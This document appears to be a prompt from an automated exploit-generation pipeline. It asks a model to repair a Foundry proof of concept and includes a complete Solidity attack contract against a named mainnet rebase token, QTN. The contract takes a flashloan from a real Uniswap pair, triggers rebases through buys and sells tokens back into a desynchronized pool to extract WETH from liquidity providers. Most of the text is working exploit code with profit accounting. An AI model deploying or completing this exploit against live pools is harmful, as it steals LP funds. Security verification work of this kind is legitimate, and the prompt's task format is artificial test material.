You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Positive rebases desynchronize the AMM pair balance and let sellers extract excess ETH
- claim: `balanceOf(uniswapV2Pair)` returns the shadow variable `uniswapV2PairAmount` instead of `_gonBalances[pair] / _gonsPerFragment`. When `rebasePlus()` increases `_totalSupply`, it reduces `_gonsPerFragment` for every holder, including the pair, so the pair's real spendable token balance grows while `balanceOf(pair)` stays stale. On the next swap, the Uniswap pair reads an understated token balance and accepts too little token input for the ETH it pays out.
- impact: An attacker can trigger positive rebases with qualifying buys, then sell tokens back into the pool against understated token reserves and extract excess ETH/WETH, draining LP value.
- exploit_paths: ["Seed liquidity so the pair holds both QTN and ETH/WETH.", "Buy from the pair with amounts that satisfy the rebase condition, causing `rebasePlus(amount)` to run.", "The pair's actual token balance increases in fragment terms after the rebase, but `balanceOf(pair)` remains at the stale `uniswapV2PairAmount`.", "Sell QTN back into the pair; because the pair underestimates its token balance, it overpays ETH/WETH to the seller."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IQTN is IERC20 {
    function uniswapV2Pair() external view returns (address);
    function totalSupply() external view returns (uint256);
    function _percentForTxLimit() external view returns (uint256);
    function _gonsPerFragment() external view returns (uint256);
    function _gonBalances(address) external view returns (uint256);
    function updateLive() external;
}

contract TokenSink {
    constructor() {}
}

contract FlawVerifier {
    address public constant QTN = 0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777Ce9e4f2Ac;
    address public constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    address public constant UNIV2_USDC_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 private _profitAmount;

    struct Plan {
        bool useFlash;
        bool viable;
        address altPair;
        uint256 capitalWeth;
        uint256 manipulateBudgetWeth;
        uint256 altBuyBudgetWeth;
        uint256 expectedEndWeth;
    }

    Plan private activePlan;
    uint256 private flashRepayAmount;
    bool private inFlash;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        IQTN(QTN).updateLive();
        if (address(this).balance > 0) {
            IWETH(WETH).deposit{value: address(this).balance}();
        }
        uint256 startWeth = IERC20(WETH).balanceOf(address(this));

        Plan memory directPlan = _choosePlan(IERC20(WETH).balanceOf(address(this)), false);
        if (directPlan.viable) {
            _executePlan(directPlan);
            _updateProfit(startWeth);
            return;
        }

        Plan memory flashPlan = _chooseFlashPlan();
        if (!flashPlan.viable) {
            _updateProfit(startWeth);
            return;
        }

        activePlan = flashPlan;
        inFlash = true;

        (uint256 amount0Out, uint256 amount1Out) = _pairOutForToken(UNIV2_USDC_WETH_PAIR, WETH, flashPlan.capitalWeth);
        IUniswapV2PairLike(UNIV2_USDC_WETH_PAIR).swap(amount0Out, amount1Out, address(this), abi.encode(uint256(1)));

        inFlash = false;
        delete activePlan;
        flashRepayAmount = 0;

        _updateProfit(startWeth);
    }

    function hiddenPairDelta() external view returns (uint256) {
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        uint256 reported = IERC20(QTN).balanceOf(primaryPair);
        uint256 gonsPerFragment = IQTN(QTN)._gonsPerFragment();
        if (gonsPerFragment == 0) {
            return 0;
        }
        uint256 trueFragments = IQTN(QTN)._gonBalances(primaryPair) / gonsPerFragment;
        return trueFragments > reported ? trueFragments - reported : 0;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(inFlash, "flash inactive");
        require(msg.sender == UNIV2_USDC_WETH_PAIR, "bad flash pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        flashRepayAmount = _sameTokenFlashRepay(borrowedWeth);

        _executePlan(activePlan);

        require(IERC20(WETH).balanceOf(address(this)) >= flashRepayAmount, "insufficient repay");
        IERC20(WETH).transfer(UNIV2_USDC_WETH_PAIR, flashRepayAmount);
    }

    function _executePlan(Plan memory plan) internal {
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        require(primaryPair != address(0), "no primary pair");

        if (plan.manipulateBudgetWeth > 0) {
            _manipulatePrimary(primaryPair, plan.manipulateBudgetWeth);
        }

        uint256 qtnBefore = IERC20(QTN).balanceOf(address(this));
        if (plan.altBuyBudgetWeth > 0) {
            _buyQtnFromAltPair(plan.altPair, plan.altBuyBudgetWeth);
        }
        uint256 qtnToSell = IERC20(QTN).balanceOf(address(this)) - qtnBefore;
        if (qtnToSell > 0) {
            _sellQtnToPrimary(primaryPair, qtnToSell);
        }
    }

    function _chooseFlashPlan() internal view returns (Plan memory best) {
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        if (primaryPair == address(0)) {
            return best;
        }

        // Path-strict infeasibility note:
        // - QTN bought from the primary pair is immediately time-locked by `_buyInfo[to]` for 5 minutes.
        // - In a single transaction, the bought QTN therefore cannot be sold back by the same recipient.
        // - Under the stated constraints, the same-tx route only remains feasible if a second on-chain
        //   WETH/QTN market exists that can provide immediately sellable QTN inventory.
        address altPair = _findAltWethPair(primaryPair);
        if (altPair == address(0)) {
            return best;
        }

        (, uint256 primaryWethReserve) = _reservesTokenWeth(primaryPair);
        if (primaryWethReserve == 0) {
            return best;
        }

        uint256[5] memory candidates = [
            primaryWethReserve / 20,
            primaryWethReserve / 10,
            primaryWethReserve / 5,
            primaryWethReserve / 4,
            primaryWethReserve / 3
        ];

        for (uint256 i = 0; i < candidates.length; i++) {
            if (candidates[i] == 0) continue;
            Plan memory candidate = _choosePlanWithAlt(candidates[i], altPair, true);
            if (candidate.viable && candidate.expectedEndWeth > best.expectedEndWeth) {
                best = candidate;
            }
        }
    }

    function _choosePlan(uint256 availableWeth, bool useFlash) internal view returns (Plan memory) {
        if (availableWeth == 0) {
            return Plan(false, false, address(0), 0, 0, 0, 0);
        }

        address primaryPair = IQTN(QTN).uniswapV2Pair();
        if (primaryPair == address(0)) {
            return Plan(false, false, address(0), 0, 0, 0, 0);
        }

        address altPair = _findAltWethPair(primaryPair);
        if (altPair == address(0)) {
            return Plan(false, false, address(0), 0, 0, 0, 0);
        }

        return _choosePlanWithAlt(availableWeth, altPair, useFlash);
    }

    function _choosePlanWithAlt(uint256 capitalWeth, address altPair, bool useFlash) internal view returns (Plan memory best) {
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        (uint256 primaryTokenReserve, uint256 primaryWethReserve) = _reservesTokenWeth(primaryPair);
        (uint256 altTokenReserve, uint256 altWethReserve) = _reservesTokenWeth(altPair);
        if (primaryTokenReserve == 0 || primaryWethReserve == 0 || altTokenReserve == 0 || altWethReserve == 0) {
            return best;
        }

        // Mechanical note:
        // The hidden rebase delta is real in `_gonBalances[pair] / _gonsPerFragment`, but Uniswap V2 only ever
        // sees `balanceOf(pair)`, which the token overrides to the stale `uniswapV2PairAmount`. As a result,
        // the pair's reserve/balance accounting remains self-consistent on the stale branch; this verifier only
        // attempts the hypothesis path when a cross-pool sell path still looks net-positive after simulation.
        uint256 supply = IQTN(QTN).totalSupply();
        uint256 txPct = IQTN(QTN)._percentForTxLimit();
        if (txPct == 0) {
            return best;
        }

        uint256[5] memory bpsChoices = [uint256(2000), 3500, 5000, 6500, 8000];
        for (uint256 i = 0; i < bpsChoices.length; i++) {
            uint256 manipBudget = (capitalWeth * bpsChoices[i]) / 10000;
            uint256 altBudget = capitalWeth - manipBudget;
            if (manipBudget == 0 || altBudget == 0) continue;

            (uint256 simTokenReserve, uint256 simWethReserve, uint256 manipSpent) = _simulateManipulation(
                primaryTokenReserve,
                primaryWethReserve,
                supply,
                txPct,
                manipBudget
            );
            if (manipSpent == 0 || simTokenReserve == 0 || simWethReserve == 0) continue;

            uint256 altQtnBought = _getAmountOut(altBudget, altWethReserve, altTokenReserve);
            if (altQtnBought == 0) continue;

            uint256 expectedEnd = _getAmountOut(altQtnBought, simTokenReserve, simWethReserve);
            uint256 repayOrCost = useFlash ? _sameTokenFlashRepay(capitalWeth) : capitalWeth;
            if (expectedEnd <= repayOrCost) continue;

            if (expectedEnd > best.expectedEndWeth) {
                best = Plan({
                    useFlash: useFlash,
                    viable: true,
                    altPair: altPair,
                    capitalWeth: capitalWeth,
                    manipulateBudgetWeth: manipBudget,
                    altBuyBudgetWeth: altBudget,
                    expectedEndWeth: expectedEnd
                });
            }
        }
    }

    function _manipulatePrimary(address primaryPair, uint256 budgetWeth) internal {
        uint256 remaining = budgetWeth;
        uint256 loops;

        while (remaining > 0 && loops < 8) {
            loops++;
            (uint256 tokenReserve, uint256 wethReserve) = _reservesTokenWeth(primaryPair);
            if (tokenReserve == 0 || wethReserve == 0) break;

            uint256 supply = IQTN(QTN).totalSupply();
            uint256 txLimit = (supply * IQTN(QTN)._percentForTxLimit()) / 100;
            uint256 desiredOut = (txLimit * 99) / 100;

            uint256 maxReasonable = tokenReserve / 5;
            if (desiredOut > maxReasonable) desiredOut = maxReasonable;
            if (desiredOut == 0) break;

            uint256 amountIn = _getAmountIn(desiredOut, wethReserve, tokenReserve);
            if (amountIn > remaining) {
                desiredOut = _getAmountOut(remaining, wethReserve, tokenReserve);
                if (desiredOut > txLimit) desiredOut = txLimit;
                if (desiredOut == 0) break;
                amountIn = _getAmountIn(desiredOut, wethReserve, tokenReserve);
                if (amountIn > remaining) break;
            }

            TokenSink sink = new TokenSink();
            IERC20(WETH).transfer(primaryPair, amountIn);
            _swapPair(primaryPair, QTN, desiredOut, address(sink));
            remaining -= amountIn;
        }
    }

    function _buyQtnFromAltPair(address altPair, uint256 wethAmountIn) internal {
        if (wethAmountIn == 0) return;
        (uint256 tokenReserve, uint256 wethReserve) = _reservesTokenWeth(altPair);
        if (tokenReserve == 0 || wethReserve == 0) return;

        uint256 qtnOut = _getAmountOut(wethAmountIn, wethReserve, tokenReserve);
        if (qtnOut == 0) return;

        IERC20(WETH).transfer(altPair, wethAmountIn);
        _swapPair(altPair, QTN, qtnOut, address(this));
    }

    function _sellQtnToPrimary(address primaryPair, uint256 qtnAmountIn) internal {
        if (qtnAmountIn == 0) return;
        (uint256 tokenReserve, uint256 wethReserve) = _reservesTokenWeth(primaryPair);
        if (tokenReserve == 0 || wethReserve == 0) return;

        uint256 wethOut = _getAmountOut(qtnAmountIn, tokenReserve, wethReserve);
        if (wethOut == 0) return;

        IERC20(QTN).transfer(primaryPair, qtnAmountIn);
        _swapPair(primaryPair, WETH, wethOut, address(this));
    }

    function _swapPair(address pair, address tokenOut, uint256 amountOut, address to) internal {
        (uint256 amount0Out, uint256 amount1Out) = _pairOutForToken(pair, tokenOut, amountOut);
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _pairOutForToken(address pair, address tokenOut, uint256 amountOut) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        if (IUniswapV2PairLike(pair).token0() == tokenOut) {
            amount0Out = amountOut;
        } else {
            amount1Out = amountOut;
        }
    }

    function _findAltWethPair(address primaryPair) internal view returns (address) {
        address[3] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY, SHIBASWAP_FACTORY];
        for (uint256 i = 0; i < factories.length; i++) {
            address pair = IUniswapV2FactoryLike(factories[i]).getPair(QTN, WETH);
            if (pair != address(0) && pair != primaryPair) {
                (uint256 tokenReserve, uint256 wethReserve) = _reservesTokenWeth(pair);
                if (tokenReserve > 0 && wethReserve > 0) {
                    return pair;
                }
            }
        }
        return address(0);
    }

    function _reservesTokenWeth(address pair) internal view returns (uint256 tokenReserve, uint256 wethReserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == QTN) {
            tokenReserve = uint256(reserve0);
            wethReserve = uint256(reserve1);
        } else {
            tokenReserve = uint256(reserve1);
            wethReserve = uint256(reserve0);
        }
    }

    function _simulateManipulation(
        uint256 reserveToken,
        uint256 reserveWeth,
        uint256 supply,
        uint256 txPct,
        uint256 budgetWeth
    ) internal pure returns (uint256 newReserveToken, uint256 newReserveWeth, uint256 spentWeth) {
        newReserveToken = reserveToken;
        newReserveWeth = reserveWeth;

        for (uint256 i = 0; i < 8 && budgetWeth > 0; i++) {
            uint256 txLimit = (supply * txPct) / 100;
            uint256 desiredOut = (txLimit * 99) / 100;
            uint256 maxReasonable = newReserveToken / 5;
            if (desiredOut > maxReasonable) desiredOut = maxReasonable;
            if (desiredOut == 0) break;

            uint256 amountIn = _getAmountIn(desiredOut, newReserveWeth, newReserveToken);
            if (amountIn > budgetWeth) {
                desiredOut = _getAmountOut(budgetWeth, newReserveWeth, newReserveToken);
                if (desiredOut > txLimit) desiredOut = txLimit;
                if (desiredOut == 0) break;
                amountIn = _getAmountIn(desiredOut, newReserveWeth, newReserveToken);
                if (amountIn > budgetWeth) break;
            }

            budgetWeth -= amountIn;
            spentWeth += amountIn;
            newReserveWeth += amountIn;
            newReserveToken -= desiredOut;
            supply += desiredOut / 5;
        }
    }

    function _sameTokenFlashRepay(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) return type(uint256).max;
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _updateProfit(uint256 startWeth) internal {
        uint256 endWeth = IERC20(WETH).balanceOf(address(this));
        _profitAmount = endWeth > startWeth ? endWeth - startWeth : 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
